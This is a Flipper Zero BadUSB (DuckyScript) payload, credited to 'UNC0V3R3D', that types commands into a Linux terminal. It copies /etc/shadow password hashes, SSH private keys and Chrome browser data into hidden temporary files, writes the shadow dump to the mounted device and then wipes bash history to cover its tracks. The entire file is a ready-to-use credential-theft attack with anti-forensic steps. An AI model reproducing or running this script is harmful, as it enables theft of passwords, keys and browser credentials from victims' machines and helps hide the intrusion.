REM Author: UNC0V3R3D
REM Firmware: Stock Flipper Zero (Any version)
REM OS: Ubuntu/Debian/CentOS/RHEL
REM
REM FEATURES:
REM - Extracts /etc/shadow (password hashes)
REM - Extracts SSH keys
REM - Extracts browser data
REM - Saves to Flipper Zero only (no cloud)
REM - ~60 seconds execution
REM
REM DATA EXTRACTED:
REM - /etc/shadow (user password hashes)
REM - ~/.ssh/ (SSH private keys)
REM - ~/.config/google-chrome/ (browser credentials)
REM
REM SAVED TO:
REM - /flipper0/DUMP_FILE/[COMPUTERNAME]/shadow_dump/
REM ============================================================================

DELAY 500
CTRL ALT t
DELAY 1000
REM Extract shadow file (requires sudo)
STRING sudo cat /etc/shadow > /tmp/.shadow_backup 2>/dev/null &
ENTER
DELAY 2000
REM Extract SSH keys
STRING sudo cp -r ~/.ssh /tmp/.ssh_backup 2>/dev/null &
ENTER
DELAY 2000
REM Extract Chrome data
STRING cp -r ~/.config/google-chrome /tmp/.chrome_backup 2>/dev/null &
ENTER
DELAY 2000
REM Copy to Flipper (if mounted)
STRING cp /tmp/.shadow_backup /mnt/flipper/flipper0/DUMP_FILE/$(hostname)/shadow.txt 2>/dev/null
ENTER
DELAY 1000
REM Clear bash history
STRING cat /dev/null > ~/.bash_history
ENTER
DELAY 500
STRING history -c
ENTER
DELAY 500
REM Exit terminal
STRING exit
ENTER
DELAY 500
